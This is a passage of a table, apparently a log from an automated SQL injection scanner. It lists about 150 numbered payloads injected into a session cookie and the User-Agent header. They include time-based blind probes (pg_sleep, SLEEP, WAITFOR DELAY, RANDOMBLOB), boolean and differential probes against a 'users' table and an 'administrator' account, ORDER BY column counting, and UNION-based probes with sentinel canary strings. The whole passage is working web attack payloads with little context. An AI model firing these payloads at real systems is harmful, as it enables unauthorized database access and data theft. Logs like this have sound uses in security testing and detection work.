| 171 | `17:33:36` | `session (cookie)` | Time-based Blind | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2)))))-- -` |
| 172 | `17:33:37` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2'` |
| 173 | `17:33:38` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2'` |
| 174 | `17:33:39` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 1-- -` |
| 175 | `17:33:39` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 2-- -` |
| 176 | `17:33:40` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 3-- -` |
| 177 | `17:33:41` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 4-- -` |
| 178 | `17:33:41` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 5-- -` |
| 179 | `17:33:42` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 6-- -` |
| 180 | `17:33:43` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 7-- -` |
| 181 | `17:33:44` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 8-- -` |
| 182 | `17:33:44` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 9-- -` |
| 183 | `17:33:45` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 10-- -` |
| 184 | `17:33:46` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 11-- -` |
| 185 | `17:33:46` | `session (cookie)` | ORDER BY Column Count | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' ORDER BY 12-- -` |
| 186 | `17:33:47` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT 'SENTINEL'\|\|'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 187 | `17:33:48` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT 'SENTINEL'\|\|'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 188 | `17:33:49` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT 'SENTINEL'+'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 189 | `17:33:50` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT CONCAT('SENTINEL','_CANARY_01'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 190 | `17:33:51` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,'SENTINEL'\|\|'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 191 | `17:33:52` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,'SENTINEL'\|\|'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 192 | `17:33:52` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,'SENTINEL'+'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 193 | `17:33:53` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,CONCAT('SENTINEL','_CANARY_02'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 194 | `17:33:54` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,'SENTINEL'\|\|'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 195 | `17:33:55` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,'SENTINEL'\|\|'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 196 | `17:33:55` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,'SENTINEL'+'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 197 | `17:33:56` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,CONCAT('SENTINEL','_CANARY_03'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 198 | `17:33:57` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 199 | `17:33:57` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 200 | `17:33:58` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,'SENTINEL'+'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 201 | `17:33:59` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_04'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 202 | `17:33:59` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 203 | `17:34:00` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 204 | `17:34:01` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 205 | `17:34:02` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_05'),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 206 | `17:34:02` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 207 | `17:34:03` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 208 | `17:34:04` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 209 | `17:34:05` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_06'),NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 210 | `17:34:05` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_07',NULL,NULL,NULL,NULL,NULL-- -` |
| 211 | `17:34:06` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_07',NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 212 | `17:34:07` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_07',NULL,NULL,NULL,NULL,NULL-- -` |
| 213 | `17:34:07` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_07'),NULL,NULL,NULL,NULL,NULL-- -` |
| 214 | `17:34:08` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_08',NULL,NULL,NULL,NULL-- -` |
| 215 | `17:34:09` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_08',NULL,NULL,NULL,NULL FROM DUAL--` |
| 216 | `17:34:10` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_08',NULL,NULL,NULL,NULL-- -` |
| 217 | `17:34:11` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_08'),NULL,NULL,NULL,NULL-- -` |
| 218 | `17:34:12` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_09',NULL,NULL,NULL-- -` |
| 219 | `17:34:12` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_09',NULL,NULL,NULL FROM DUAL--` |
| 220 | `17:34:13` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_09',NULL,NULL,NULL-- -` |
| 221 | `17:34:14` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_09'),NULL,NULL,NULL-- -` |
| 222 | `17:34:14` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_10',NULL,NULL-- -` |
| 223 | `17:34:15` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_10',NULL,NULL FROM DUAL--` |
| 224 | `17:34:16` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_10',NULL,NULL-- -` |
| 225 | `17:34:17` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_10'),NULL,NULL-- -` |
| 226 | `17:34:17` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_11',NULL-- -` |
| 227 | `17:34:18` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_11',NULL FROM DUAL--` |
| 228 | `17:34:19` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_11',NULL-- -` |
| 229 | `17:34:19` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_11'),NULL-- -` |
| 230 | `17:34:20` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_12'-- -` |
| 231 | `17:34:21` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_12' FROM DUAL--` |
| 232 | `17:34:22` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_12'-- -` |
| 233 | `17:34:22` | `session (cookie)` | UNION-based | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_12')-- -` |
| 234 | `17:34:23` | `User-Agent (header)` | Differential Probe | `' OR "/*"/*`*/[1]=(SELECT(CASE WHEN(1=1)THEN 1 ELSE 1/0 END))--` |
| 235 | `17:34:24` | `User-Agent (header)` | Error-based CAST | `-0+CAST((SELECT 1) AS INT)` |
| 236 | `17:34:25` | `User-Agent (header)` | Differential Probe | `' AND jsonb_typeof(data) IS NOT NULL AND '[0]'::vector <=> '[0]'::vector--` |
| 237 | `17:34:25` | `User-Agent (header)` | Syntax Breakout Fuzzing | `'` |
| 238 | `17:34:26` | `User-Agent (header)` | Syntax Breakout Fuzzing | `''` |
| 239 | `17:34:27` | `User-Agent (header)` | Syntax Breakout Fuzzing | `"` |
| 240 | `17:34:28` | `User-Agent (header)` | Syntax Breakout Fuzzing | `')` |
| 241 | `17:34:28` | `User-Agent (header)` | Syntax Breakout Fuzzing | `")` |
| 242 | `17:34:30` | `User-Agent (header)` | Syntax Breakout Fuzzing | `'--` |
| 243 | `17:34:31` | `User-Agent (header)` | Syntax Breakout Fuzzing | `';--` |
| 244 | `17:34:32` | `User-Agent (header)` | Boolean True Probe | `' AND '1'='1` |
| 245 | `17:34:32` | `User-Agent (header)` | Boolean False Probe | `' AND '1'='2` |
| 246 | `17:34:33` | `User-Agent (header)` | Boolean True Probe | `' AND 1=1--` |
| 247 | `17:34:34` | `User-Agent (header)` | Boolean False Probe | `' AND 1=2--` |
| 248 | `17:34:34` | `User-Agent (header)` | Differential Probe | `' AND (SELECT 'a' FROM users LIMIT 1)='a` |
| 249 | `17:34:35` | `User-Agent (header)` | Differential Probe | `' AND (SELECT 'a' FROM users LIMIT 1)='b` |
| 250 | `17:34:36` | `User-Agent (header)` | Differential Probe | `' AND (SELECT 'a' FROM users WHERE username='administrator')='a` |
| 251 | `17:34:37` | `User-Agent (header)` | Differential Probe | `' AND (SELECT 'a' FROM users WHERE username='nonexistent_sqli_test_user')='a` |
| 252 | `17:34:37` | `User-Agent (header)` | Boolean True Probe | `' AND (SELECT 1 FROM DUAL)=1 AND '1'='1` |
| 253 | `17:34:38` | `User-Agent (header)` | Boolean True Probe | `' AND (SELECT 1 FROM DUAL)=2 AND '1'='1` |
| 254 | `17:34:39` | `User-Agent (header)` | Boolean True Probe | `' AND (SELECT version()) IS NOT NULL AND '1'='1` |
| 255 | `17:34:40` | `User-Agent (header)` | Boolean True Probe | `' AND (SELECT version()) IS NULL AND '1'='1` |
| 256 | `17:34:40` | `User-Agent (header)` | Boolean True Probe | `' AND @@version=@@version AND '1'='1` |
| 257 | `17:34:41` | `User-Agent (header)` | Boolean True Probe | `' AND @@version='' AND '1'='1` |
| 258 | `17:34:42` | `User-Agent (header)` | Boolean True Probe | `' AND sqlite_version()=sqlite_version() AND '1'='1` |
| 259 | `17:34:42` | `User-Agent (header)` | Boolean True Probe | `' AND sqlite_version()='' AND '1'='1` |
| 260 | `17:34:43` | `User-Agent (header)` | Boolean True Probe | `' AND @@VERSION=@@VERSION AND '1'='1` |
| 261 | `17:34:44` | `User-Agent (header)` | Boolean True Probe | `' AND @@VERSION='' AND '1'='1` |
| 262 | `17:34:45` | `User-Agent (header)` | Time-based Blind | `'\|\|(SELECT pg_sleep(3))\|\|'` |
| 263 | `17:34:45` | `User-Agent (header)` | Time-based Blind | `' AND (SELECT 1 FROM (SELECT(SLEEP(3)))snt)-- -` |
| 264 | `17:34:46` | `User-Agent (header)` | Differential Probe | `'\|\|(SELECT dbms_pipe.receive_message(('RDS'),3) FROM DUAL)\|\|'` |
| 265 | `17:34:47` | `User-Agent (header)` | Time-based Blind | `'; WAITFOR DELAY '0:0:3'--` |
| 266 | `17:34:47` | `User-Agent (header)` | Time-based Blind | `' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2)))))-- -` |
| 267 | `17:34:49` | `User-Agent (header)` | Time-based Blind | `'; SELECT pg_sleep(3);--` |
| 268 | `17:34:51` | `User-Agent (header)` | Time-based Blind | `'; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))));--` |
| 269 | `17:34:51` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 1-- -` |
| 270 | `17:34:52` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 2-- -` |
| 271 | `17:34:53` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 3-- -` |
| 272 | `17:34:53` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 4-- -` |
| 273 | `17:34:54` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 5-- -` |
| 274 | `17:34:55` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 6-- -` |
| 275 | `17:34:56` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 7-- -` |
| 276 | `17:34:57` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 8-- -` |
| 277 | `17:34:58` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 9-- -` |
| 278 | `17:34:58` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 10-- -` |
| 279 | `17:34:59` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 11-- -` |
| 280 | `17:35:00` | `User-Agent (header)` | ORDER BY Column Count | `' ORDER BY 12-- -` |
| 281 | `17:35:01` | `User-Agent (header)` | UNION-based | `' UNION SELECT 'SENTINEL'\|\|'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 282 | `17:35:01` | `User-Agent (header)` | UNION-based | `' UNION SELECT 'SENTINEL'\|\|'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 283 | `17:35:02` | `User-Agent (header)` | UNION-based | `' UNION SELECT 'SENTINEL'+'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 284 | `17:35:03` | `User-Agent (header)` | UNION-based | `' UNION SELECT CONCAT('SENTINEL','_CANARY_01'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 285 | `17:35:04` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,'SENTINEL'\|\|'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 286 | `17:35:04` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,'SENTINEL'\|\|'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 287 | `17:35:05` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,'SENTINEL'+'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 288 | `17:35:06` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,CONCAT('SENTINEL','_CANARY_02'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 289 | `17:35:07` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,'SENTINEL'\|\|'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 290 | `17:35:08` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,'SENTINEL'\|\|'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 291 | `17:35:08` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,'SENTINEL'+'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 292 | `17:35:10` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,CONCAT('SENTINEL','_CANARY_03'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 293 | `17:35:10` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 294 | `17:35:11` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 295 | `17:35:12` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,'SENTINEL'+'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 296 | `17:35:12` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_04'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 297 | `17:35:13` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 298 | `17:35:14` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 299 | `17:35:15` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 300 | `17:35:15` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_05'),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 301 | `17:35:16` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 302 | `17:35:17` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 303 | `17:35:18` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 304 | `17:35:18` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_06'),NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 305 | `17:35:19` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_07',NULL,NULL,NULL,NULL,NULL-- -` |
| 306 | `17:35:20` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_07',NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 307 | `17:35:20` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_07',NULL,NULL,NULL,NULL,NULL-- -` |
| 308 | `17:35:21` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_07'),NULL,NULL,NULL,NULL,NULL-- -` |
| 309 | `17:35:22` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_08',NULL,NULL,NULL,NULL-- -` |
| 310 | `17:35:22` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_08',NULL,NULL,NULL,NULL FROM DUAL--` |
| 311 | `17:35:23` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_08',NULL,NULL,NULL,NULL-- -` |
| 312 | `17:35:24` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_08'),NULL,NULL,NULL,NULL-- -` |
| 313 | `17:35:25` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_09',NULL,NULL,NULL-- -` |
| 314 | `17:35:25` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_09',NULL,NULL,NULL FROM DUAL--` |
| 315 | `17:35:26` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_09',NULL,NULL,NULL-- -` |
| 316 | `17:35:27` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_09'),NULL,NULL,NULL-- -` |
| 317 | `17:35:27` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_10',NULL,NULL-- -` |
| 318 | `17:35:28` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_10',NULL,NULL FROM DUAL--` |
| 319 | `17:35:29` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_10',NULL,NULL-- -` |
| 320 | `17:35:30` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_10'),NULL,NULL-- -` |
